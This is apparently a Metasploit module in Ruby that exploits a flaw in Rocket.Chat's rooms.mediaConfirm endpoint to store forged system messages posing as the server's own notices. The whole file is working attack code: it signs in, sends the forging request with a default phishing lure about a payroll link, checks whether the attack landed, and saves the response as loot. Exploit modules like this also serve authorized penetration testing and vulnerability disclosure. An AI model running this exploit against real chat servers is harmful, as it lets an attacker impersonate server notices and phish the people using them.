class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 forged system message through rooms.mediaConfirm (VULN-012)',
        'Description' => %q{
          Rocket.Chat is a self-hosted team chat server. Message types registered as
          system are rendered by the client as the server's own notices, and
          chat.sendMessage refuses to store one on a caller's behalf.
          rooms.mediaConfirm, the second half of the two-step upload, copies t and msg
          out of the caller's body into the stored message with no such check. This
          module confirms a pending upload the operator names, setting the system type
          and the text it should carry, and reports the type the server stored. The
          operator supplies the room, the pending media id and the forged type and
          text.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/rooms.mediaConfirm']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('ROOMID', [true, 'The room the pending upload belongs to', 'GENERAL']),
      OptString.new('FILEID', [true, 'A pending media id from the operator\'s own rooms.media upload (single use: mediaConfirm consumes it)', '6b05e1bee7422a44df31e32a']),
      OptString.new('FORGEDTYPE', [true, 'The system message type to set (r renders as a room-name notice)', 'r']),
      OptString.new('FORGEDTEXT', [true, 'The text the forged notice carries', 'Payroll update: see the pinned link']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = confirm_media
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = parse_json(res)['success'] == true && parse_json(res).dig('message', 't') == datastore['FORGEDTYPE']
    fail_with(Failure::NotVulnerable, 'VULN-012: the attack did not land') unless hit

    print_good("#{peer} - VULN-012: exploited")
    msg = parse_json(res)['message'] || {}
    print_good("#{peer} - stored message #{msg['_id']} in #{msg['rid']} "\
               "with t=#{msg['t']} (a system type the ordinary send path "\
               "refuses) and msg=#{msg['msg'].inspect}")
    path = store_loot('blue_spider.vuln_012', 'text/plain', rhost, res.body.to_s, 'vuln_012.txt', 'VULN-012 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-012 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def confirm_media
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, datastore['ROOMID'], datastore['FILEID']),
      'ctype' => 'application/json',
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id },
      'data' => { 't' => datastore['FORGEDTYPE'],
                  'msg' => datastore['FORGEDTEXT'] }.to_json
    })
  end
end
